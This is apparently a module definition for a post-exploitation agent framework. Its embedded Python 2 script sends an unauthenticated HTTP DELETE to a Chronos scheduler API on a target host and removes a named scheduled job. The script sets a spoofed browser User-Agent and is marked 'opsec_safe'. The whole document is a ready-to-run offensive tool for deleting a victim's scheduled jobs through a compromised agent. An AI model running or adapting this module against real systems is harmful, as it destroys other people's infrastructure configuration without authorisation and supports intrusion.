name: Chronos API Delete Job
authors:
  - '@TweekFawkes'
description: Delete a Chronos job using the HTTP API service for the Chronos Framework
software: ''
techniques:
  - T1106
background: true
output_extension: ''
needs_admin: false
opsec_safe: true
language: python
min_language_version: '2.6'
comments:
  - 'Docs: https://mesos.github.io/chronos/docs/api.html'
  - 'urllib2 DELETE method credits to: http://stackoverflow.com/questions/21243834/doing-put-using-python-urllib2'
options:
  - name: Agent
    description: Agent to execute module on.
    required: true
    value: ''
  - name: Target
    description: FQDN, domain name, or hostname to lookup on the remote target.
    required: true
    value: chronos.mesos
  - name: Port
    description: The port to connect to.
    required: true
    value: '8080'
  - name: Name
    description: The name of the chronos job.
    required: true
    value: scheduledJob001
script: |
  import urllib2

  target = "{{ Target }}"
  port = "{{ Port }}"
  name = "{{ Name }}"

  url = "http://" + target + ":" + port + "/scheduler/job/" + name

  class MethodRequest(urllib2.Request):
      def __init__(self, *args, **kwargs):
          if 'method' in kwargs:
              self._method = kwargs['method']
              del kwargs['method']
          else:
              self._method = None
          return urllib2.Request.__init__(self, *args, **kwargs)

      def get_method(self, *args, **kwargs):
          if self._method is not None:
              return self._method
          return urllib2.Request.get_method(self, *args, **kwargs)

  try:
      request = MethodRequest(url, method='DELETE')
      request.add_header('User-Agent',
                     'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
                     'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
      opener = urllib2.build_opener(urllib2.HTTPHandler)
      content = opener.open(request).read()
      print(str(content))
  except Exception as e:
      print("Failure sending payload: " + str(e))

  print("Finished")